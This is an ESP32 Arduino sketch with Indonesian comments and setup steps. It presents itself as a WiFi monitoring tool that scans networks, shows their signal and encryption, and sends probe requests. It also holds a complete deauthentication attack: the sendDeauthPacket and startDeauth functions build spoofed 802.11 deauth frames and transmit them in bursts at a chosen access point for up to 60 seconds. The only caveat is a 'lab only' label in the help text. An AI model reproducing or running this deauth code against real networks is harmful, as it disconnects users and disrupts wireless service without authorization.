/*saya menajalankan kode ini menggunakan Arduino IDE dengan menggunakan bahasa pemrograman c++*/

/*REQUIREMENT*/

/*
  LAPTOP/PC.
  ARDUINO IDE LATEST.
  NODEMCU AMICA LUA WIFI ESP12 CP2102 | atau model lain.
  WiFi Antenna Antena 2.4Ghz 3DBi for ESP32 ESP8266 (OPSIONAL).
  KABEL USB TO MINI USB.
  PORT USB.
  BOARD MANAGER for ESP32 by espressif system.
  Serial Monitor 115200.
*/

/*
1. Instal Arduino IDE dan pastikan Anda menambahkan dukungan board ESP32

2. Sambungkan ESP32 Anda ke komputer

3. Pilih board ESP32 yang sesuai dari menu Tools > Board

4. Salin kode di bawah ke Arduino IDE

5. Kompile lalu Upload kode ke ESP32

6. Buka Serial Monitor (baud rate 115200) untuk melihat hasil pemindaian
*/ 

#include "WiFi.h"
#include "esp_wifi.h"
#include <vector>
#include <string>

// Struktur untuk menyimpan data jaringan
struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  wifi_auth_mode_t encryptionType;
};

// Global variables
std::vector<NetworkInfo> networkList;
String cmdBuffer = "";
bool cmdComplete = false;
bool monitorMode = false;
bool continuousScan = false;
int targetNetworkIndex = -1;

// Variabel untuk fitur deauth
bool deauthActive = false;
int deauthTarget = -1;
unsigned long deauthStartTime = 0;
unsigned long deauthTimeout = 10000; // 10 detik durasi deauth default

// Buffer untuk menyimpan perintah
const int MAX_CMD_LENGTH = 64;
char cmdString[MAX_CMD_LENGTH];
int cmdIndex = 0;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  Serial.println("\n=== ESP32 WiFi Monitoring Tool ===");
  printHelp();
}

void loop() {
  // Proses masukan perintah
  processSerialInput();
  
  // Periksa jika ada perintah lengkap
  if (cmdComplete) {
    executeCommand();
    cmdComplete = false;
  }
  
  // Jika dalam mode pemindaian kontinyu
  if (continuousScan) {
    scanNetworks();
    delay(5000); // Delay antar pemindaian
  }
  
  // Jika dalam mode monitoring jaringan spesifik
  if (monitorMode && targetNetworkIndex >= 0 && targetNetworkIndex < networkList.size()) {
    monitorNetwork(networkList[targetNetworkIndex]);
  }
  
  // Jika deauth aktif, lakukan deauth secara kontinyu
  if (deauthActive && deauthTarget >= 0 && deauthTarget < networkList.size()) {
    // Kirim paket deauth setiap 100ms
    static unsigned long lastDeauthTime = 0;
    if (millis() - lastDeauthTime > 100) {
      lastDeauthTime = millis();
      sendDeauthPacket(networkList[deauthTarget]);
    }
    
    // Cek timeout deauth
    if (millis() - deauthStartTime > deauthTimeout) {
      Serial.println("\n[INFO] Deauth attack selesai");
      deauthActive = false;
    }
  }
}

void processSerialInput() {
  while (Serial.available() > 0) {
    char inChar = (char)Serial.read();
    
    // Jika karakter adalah newline, tanda perintah lengkap
    if (inChar == '\n' || inChar == '\r') {
      if (cmdIndex > 0) {
        cmdString[cmdIndex] = '\0'; // Null terminate string
        cmdBuffer = String(cmdString);
        cmdComplete = true;
        cmdIndex = 0;
      }
    } 
    // Selama belum melebihi buffer, tambahkan karakter
    else if (cmdIndex < MAX_CMD_LENGTH - 1) {
      cmdString[cmdIndex++] = inChar;
    }
  }
}

void executeCommand() {
  cmdBuffer.trim();
  
  // Pisahkan perintah dan parameter
  int spaceIndex = cmdBuffer.indexOf(' ');
  String command = (spaceIndex == -1) ? cmdBuffer : cmdBuffer.substring(0, spaceIndex);
  String param = (spaceIndex == -1) ? "" : cmdBuffer.substring(spaceIndex + 1);
  
  command.toLowerCase();
  
  if (command == "help" || command == "?") {
    printHelp();
  }
  else if (command == "scan") {
    scanNetworks();
  }
  else if (command == "list") {
    listNetworks();
  }
  else if (command == "monitor") {
    if (param.length() > 0) {
      int index = param.toInt();
      if (index >= 0 && index < networkList.size()) {
        Serial.print("Mulai monitoring jaringan: ");
        Serial.println(networkList[index].ssid);
        targetNetworkIndex = index;
        monitorMode = true;
        continuousScan = false;
        deauthActive = false; // Pastikan deauth dimatikan
      } else {
        Serial.println("Error: Indeks jaringan tidak valid");
      }
    } else {
      Serial.println("Penggunaan: monitor <index>");
    }
  }
  else if (command == "stop") {
    Serial.println("Menghentikan semua aktivitas monitoring");
    monitorMode = false;
    continuousScan = false;
    deauthActive = false;
  }
  else if (command == "continuous") {
    Serial.println("Memulai pemindaian kontinyu");
    continuousScan = true;
    monitorMode = false;
    deauthActive = false;
  }
  else if (command == "channel") {
    if (param.length() > 0) {
      int channel = param.toInt();
      if (channel >= 1 && channel <= 13) {
        Serial.print("Menyetel channel ke: ");
        Serial.println(channel);
        WiFi.setChannel(channel);
      } else {
        Serial.println("Error: Channel harus antara 1-13");
      }
    } else {
      Serial.println("Penggunaan: channel <1-13>");
    }
  }
  else if (command == "info") {
    if (param.length() > 0) {
      int index = param.toInt();
      if (index >= 0 && index < networkList.size()) {
        printNetworkDetails(networkList[index]);
      } else {
        Serial.println("Error: Indeks jaringan tidak valid");
      }
    } else {
      Serial.println("Penggunaan: info <index>");
    }
  }
  else if (command == "deauth") {
    if (param.length() > 0) {
      int index = param.toInt();
      if (index >= 0 && index < networkList.size()) {
        startDeauth(index);
      } else {
        Serial.println("Error: Indeks jaringan tidak valid");
      }
    } else {
      Serial.println("Penggunaan: deauth <index>");
    }
  }
  else if (command == "deauthtime") {
    if (param.length() > 0) {
      int seconds = param.toInt();
      if (seconds > 0 && seconds <= 60) {
        Serial.print("Durasi deauth diatur ke: ");
        Serial.print(seconds);
        Serial.println(" detik");
        deauthTimeout = seconds * 1000;
      } else {
        Serial.println("Error: Durasi harus antara 1-60 detik");
      }
    } else {
      Serial.println("Penggunaan: deauthtime <1-60>");
    }
  }
  else if (command == "probe") {
    Serial.println("Mengirim probe request untuk menemukan hidden SSID");
    sendProbeRequests();
  }
  else if (command == "clear") {
    // Hapus layar dengan mengirim banyak baris baru
    for (int i = 0; i < 50; i++) {
      Serial.println();
    }
  }
  else {
    Serial.print("Perintah tidak dikenal: ");
    Serial.println(cmdBuffer);
    Serial.println("Ketik 'help' untuk daftar perintah");
  }
}

void printHelp() {
  Serial.println("\n=== Perintah yang tersedia ===");
  Serial.println("scan       : Memindai jaringan WiFi");
  Serial.println("list       : Menampilkan daftar jaringan ditemukan");
  Serial.println("info <idx> : Menampilkan detail jaringan dengan indeks");
  Serial.println("monitor <idx> : Mulai monitoring jaringan");
  Serial.println("continuous : Mulai pemindaian kontinyu");
  Serial.println("channel <1-13> : Mengatur channel WiFi");
  Serial.println("deauth <idx>   : Memulai deauth attack (lab only)");
  Serial.println("deauthtime <1-60> : Mengatur durasi deauth (detik)");
  Serial.println("probe      : Mengirim probe untuk menemukan hidden SSID");
  Serial.println("stop       : Menghentikan semua aktivitas");
  Serial.println("clear      : Membersihkan layar");
  Serial.println("help       : Menampilkan bantuan ini");
  Serial.println("Catatan: <idx> adalah indeks jaringan dari daftar");
  Serial.println("================================================");
}

void scanNetworks() {
  Serial.println("\nMemulai pemindaian jaringan WiFi...");
  
  // Lakukan pemindaian
  int networkCount = WiFi.scanNetworks();
  
  // Kosongkan list sebelumnya
  networkList.clear();
  
  if (networkCount == 0) {
    Serial.println("Tidak ada jaringan WiFi yang ditemukan");
  } else {
    Serial.print(networkCount);
    Serial.println(" jaringan WiFi ditemukan");
    
    // Tampilkan dan simpan informasi jaringan
    for (int i = 0; i < networkCount; ++i) {
      NetworkInfo network;
      network.ssid = WiFi.SSID(i);
      network.bssid = WiFi.BSSIDstr(i);
      network.rssi = WiFi.RSSI(i);
      network.channel = WiFi.channel(i);
      network.encryptionType = WiFi.encryptionType(i);
      
      networkList.push_back(network);
      
      // Tampilkan informasi dasar
      Serial.print(i);
      Serial.print(": ");
      Serial.print(network.ssid);
      Serial.print(" (");
      Serial.print(network.rssi);
      Serial.print("dBm) CH:");
      Serial.print(network.channel);
      Serial.print(" ");
      printEncryptionType(network.encryptionType);
      Serial.println();
    }
  }
  
  Serial.println("Pemindaian selesai");
}

void listNetworks() {
  if (networkList.size() == 0) {
    Serial.println("Tidak ada jaringan dalam daftar. Lakukan 'scan' terlebih dahulu.");
    return;
  }
  
  Serial.println("\n=== Daftar Jaringan ===");
  for (size_t i = 0; i < networkList.size(); i++) {
    Serial.print(i);
    Serial.print(": ");
    Serial.print(networkList[i].ssid);
    Serial.print(" (");
    Serial.print(networkList[i].rssi);
    Serial.print("dBm) CH:");
    Serial.println(networkList[i].channel);
  }
}

void printNetworkDetails(NetworkInfo network) {
  Serial.println("\n=== Detail Jaringan ===");
  Serial.print("SSID: ");
  Serial.println(network.ssid);
  Serial.print("BSSID: ");
  Serial.println(network.bssid);
  Serial.print("Channel: ");
  Serial.println(network.channel);
  Serial.print("Signal Strength: ");
  Serial.print(network.rssi);
  Serial.println(" dBm");
  Serial.print("Encryption: ");
  printEncryptionType(network.encryptionType);
  Serial.println();
  
  // Estimasi kualitas koneksi
  if (network.rssi > -50) {
    Serial.println("Signal Quality: Excellent");
  } else if (network.rssi > -60) {
    Serial.println("Signal Quality: Good");
  } else if (network.rssi > -70) {
    Serial.println("Signal Quality: Fair");
  } else {
    Serial.println("Signal Quality: Poor");
  }
  
  // Cek kemungkinan kerentanan
  if (network.encryptionType == WIFI_AUTH_OPEN) {
    Serial.println("\n[WARNING] Jaringan ini tidak terenkripsi (Open)");
    Serial.println("Vulnerable to: Sniffing, Man-in-the-middle");
  } else if (network.encryptionType == WIFI_AUTH_WEP) {
    Serial.println("\n[WARNING] Jaringan ini menggunakan WEP (tidak aman)");
    Serial.println("Vulnerable to: WEP cracking attacks");
  }
}

void printEncryptionType(wifi_auth_mode_t encType) {
  switch(encType) {
    case WIFI_AUTH_OPEN:
      Serial.print("Open");
      break;
    case WIFI_AUTH_WEP:
      Serial.print("WEP");
      break;
    case WIFI_AUTH_WPA_PSK:
      Serial.print("WPA-PSK");
      break;
    case WIFI_AUTH_WPA2_PSK:
      Serial.print("WPA2-PSK");
      break;
    case WIFI_AUTH_WPA_WPA2_PSK:
      Serial.print("WPA/WPA2-PSK");
      break;
    case WIFI_AUTH_WPA2_ENTERPRISE:
      Serial.print("WPA2-Enterprise");
      break;
    default:
      Serial.print("Unknown");
      break;
  }
}

void monitorNetwork(NetworkInfo network) {
  // Simulasi monitoring jaringan - menampilkan kekuatan sinyal berkala
  static unsigned long lastUpdate = 0;
  unsigned long currentMillis = millis();
  
  if (currentMillis - lastUpdate > 1000) {
    lastUpdate = currentMillis;
    
    // Lakukan pemindaian untuk mendapatkan data terbaru
    WiFi.scanNetworks(true); // Async scan
    delay(100);
    
    // Cari jaringan target
    int networkCount = WiFi.scanComplete();
    if (networkCount > 0) {
      for (int i = 0; i < networkCount; i++) {
        if (WiFi.SSID(i) == network.ssid && WiFi.BSSIDstr(i) == network.bssid) {
          int currentRSSI = WiFi.RSSI(i);
          network.rssi = currentRSSI; // Update RSSI
          
          Serial.print("[Monitor] ");
          Serial.print(network.ssid);
          Serial.print(" RSSI: ");
          Serial.print(currentRSSI);
          Serial.println(" dBm");
          
          // Tampilkan indikator visual kekuatan sinyal
          Serial.print("Signal: [");
          int bars = map(currentRSSI, -100, -40, 0, 10);
          for (int j = 0; j < 10; j++) {
            Serial.print(j < bars ? "=" : " ");
          }
          Serial.println("]");
          break;
        }
      }
      
      // Bersihkan hasil scan
      WiFi.scanDelete();
    }
  }
}

void startDeauth(int index) {
  if (index < 0 || index >= networkList.size()) {
    Serial.println("Error: Indeks jaringan tidak valid");
    return;
  }
  
  Serial.print("\n[DEAUTH] Memulai deauth attack pada: ");
  Serial.print(networkList[index].ssid);
  Serial.print(" (");
  Serial.print(networkList[index].bssid);
  Serial.println(")");
  
  // Mengatur channel sesuai dengan target
  WiFi.setChannel(networkList[index].channel);
  delay(50);
  
  // Aktifkan mode deauth
  deauthActive = true;
  deauthTarget = index;
  deauthStartTime = millis();
  
  // Nonaktifkan mode lain
  monitorMode = false;
  continuousScan = false;
  
  // Informasi durasi
  Serial.print("[INFO] Deauth akan berjalan selama ");
  Serial.print(deauthTimeout / 1000);
  Serial.println(" detik");
}

void sendDeauthPacket(NetworkInfo network) {
  // Konversi string BSSID ke array byte
  uint8_t bssid[6];
  if (sscanf(network.bssid.c_str(), "%x:%x:%x:%x:%x:%x", 
         &bssid[0], &bssid[1], &bssid[2], 
         &bssid[3], &bssid[4], &bssid[5]) != 6) {
    Serial.println("[ERROR] Format BSSID tidak valid");
    return;
  }

  // Aktifkan mode promiscuous untuk pengiriman paket raw
  esp_wifi_set_promiscuous(true);
  
  // Paket 1: Deauth broadcast (kepada semua klien)
  uint8_t deauthFrame1[26] = {
    0xc0, 0x00,             // Type: deauth (subtype 12, type 0)
    0x3a, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination: broadcast
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Source (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
    0x00, 0x00,             // Sequence
    0x01, 0x00              // Reason code: Unspecified
  };
  
  // Paket 2: Deauth dari klien ke AP (memutus dalam dua arah)
  uint8_t deauthFrame2[26] = {
    0xc0, 0x00,             // Type: deauth
    0x3a, 0x01,             // Duration
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Destination: AP
    0x22, 0x33, 0x44, 0x55, 0x66, 0x77,  // Source: random client
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
    0x00, 0x00,             // Sequence
    0x01, 0x00              // Reason code: Unspecified
  };
  
  // Kirim paket deauth dengan burst mode (10 paket) untuk efektivitas maksimal
  for (int i = 0; i < 10; i++) {
    // Kirim paket broadcast
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame1, sizeof(deauthFrame1), false);
    delay(1);
    
    // Kirim paket dari klien ke AP
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame2, sizeof(deauthFrame2), false);
    delay(1);
  }
  
  // Kembalikan ke mode normal
  esp_wifi_set_promiscuous(false);
  
  // Tampilkan indikator pengiriman
  Serial.print(".");
}

void sendProbeRequests() {
  Serial.println("\n[Probe Requests]");
  Serial.println("Mengirim probe requests untuk semua channel");
  
  for (int ch = 1; ch <= 13; ch++) {
    Serial.print("Probing channel ");
    Serial.print(ch);
    Serial.println("...");
    WiFi.setChannel(ch);
    
    // Buat paket probe request
    uint8_t probeFrame[36] = {
      0x40, 0x00,                         // Frame Control: Probe Request
      0x00, 0x00,                         // Duration
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
      0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source (Random MAC)
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: broadcast
      0x00, 0x00,                         // Sequence number
      // SSID parameter set (length 0 = wildcard)
      0x00, 0x00,
      // Supported rates
      0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
    };
    
    // Aktifkan mode promiscuous
    esp_wifi_set_promiscuous(true);
    
    // Kirim paket probe request
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, probeFrame, sizeof(probeFrame), false);
      delay(10);
    }
    
    delay(200);
  }
  
  Serial.println("Probe requests selesai");
  
  // Lakukan scan untuk memeriksa apakah ada SSID tersembunyi yang terdeteksi
  scanNetworks();
}
